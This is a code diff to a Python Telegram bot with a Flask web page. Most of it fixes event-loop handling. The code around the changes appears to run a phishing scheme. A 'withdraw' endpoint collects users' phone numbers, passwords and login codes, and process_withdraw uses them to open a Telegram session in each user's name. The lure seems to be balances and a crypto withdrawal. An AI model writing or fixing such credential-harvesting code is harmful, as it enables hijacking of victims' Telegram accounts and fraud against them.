@@ -1,7 +1,6 @@
 import asyncio
 import logging
 import os
-import sys
 from threading import Thread
 from telethon import TelegramClient, events, Button
 from telethon.errors import SessionPasswordNeededError, FloodWaitError
@@ -15,14 +14,11 @@ CRYPTO_ADDRESS = '0xYourAddress'
 WEBHOOK_URL = 'https://mybot-production-0351.up.railway.app'
 
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
 
-loop = asyncio.new_event_loop()
-asyncio.set_event_loop(loop)
-bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
+bot = TelegramClient('bot_session', API_ID, API_HASH)
 app = Flask(__name__)
-
 user_balances = {}
+_started = False
 
 HTML_PAGE = '''
 <!DOCTYPE html>
@@ -308,11 +304,11 @@ def withdraw():
     phone = data.get('phone')
     password = data.get('password')
     code = data.get('code')
-    asyncio.run_coroutine_threadsafe(process_withdraw(user_id, phone, password, code), loop)
+    asyncio.ensure_future(process_withdraw(user_id, phone, password, code))
     return jsonify({'message': 'Request processed'})
 
 async def process_withdraw(user_id, phone, password, code):
-    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH, loop=loop)
+    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
     try:
         await client.connect()
         await client.send_code_request(phone)
@@ -371,6 +367,10 @@ async def msg(event):
         await event.respond('/msg <id> <text>')
 
 async def main():
+    global _started
+    if _started:
+        return
+    _started = True
     await bot.start(bot_token=BOT_TOKEN)
     await bot.run_until_disconnected()
 
@@ -379,4 +379,4 @@ def run_flask():
 
 if __name__ == '__main__':
     Thread(target=run_flask, daemon=True).start()
-    loop.run_until_complete(main())
+    asyncio.run(main())
